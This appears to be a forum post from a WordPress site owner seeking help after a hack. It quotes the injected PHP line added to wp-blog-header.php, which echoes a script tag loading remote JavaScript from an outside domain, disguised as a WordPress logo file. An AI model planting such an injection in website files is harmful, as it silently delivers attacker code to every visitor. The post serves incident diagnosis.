<p>For some reason, my site was hacked.</p>  <p>I checked my FTP files and I noticed that <code>wp-blog-header.php</code> was modified recently.</p>  <p>This is my <code>wp-blog-header.php</code> before it was hacked:</p>  <pre><code>&lt;?php   /**  * Loads the WordPress environment and template.  *  * @package WordPress  */  if ( !isset($wp_did_header) ) {      $wp_did_header = true;      require_once( dirname(__FILE__) . '/wp-load.php' );      wp();      require_once( ABSPATH . WPINC . '/template-loader.php' );  } </code></pre>  <p>This is my file after it has been hacked:</p>  <pre><code>&lt;?php echo "&lt;script type='text/javascript' src='http://www.oxxtm.com/images/wp-logo.js'&gt;&lt;/script&gt;";  /**  * Loads the WordPress environment and template. ... </code></pre>  <p>So, they added this line to my file:</p>  <pre><code>echo "&lt;script type='text/javascript' src='http://www.oxxtm.com/images/wp-logo.js'&gt;&lt;/script&gt;";  </code></pre>  <p>When I remove this line, my site works fine, but in a few hours they add this line again. I checked my database lines but I couldn't find anything wrong. It appears to me it's a new failure. I googled it yesterday and I couldn't find much, only some french websites that they didn't have any clear solution to this problem. So, have anyone experienced it before?</p>  <p>These are plugins that I'm using in this site and their respective versions:</p>  <pre><code>WordPress v4.1.8 Advanced Custom Fields v4.0.0 </code></pre>
